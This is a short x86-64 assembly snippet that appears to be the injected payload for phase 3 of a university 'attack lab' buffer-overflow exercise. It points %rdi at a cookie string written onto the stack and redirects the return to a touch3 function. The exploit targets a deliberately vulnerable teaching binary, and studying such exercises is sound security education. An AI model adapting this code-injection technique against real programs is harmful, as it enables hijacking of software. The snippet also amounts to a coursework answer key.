movq $0x5560a908,%rdi  # hex string pointer
movq $0x401c69,%rax  # touch3 address
movq %rax,(%rsp)  # write to mem
movq $0x3232316135636633,%rax
movq %rax,(%rdi)
ret
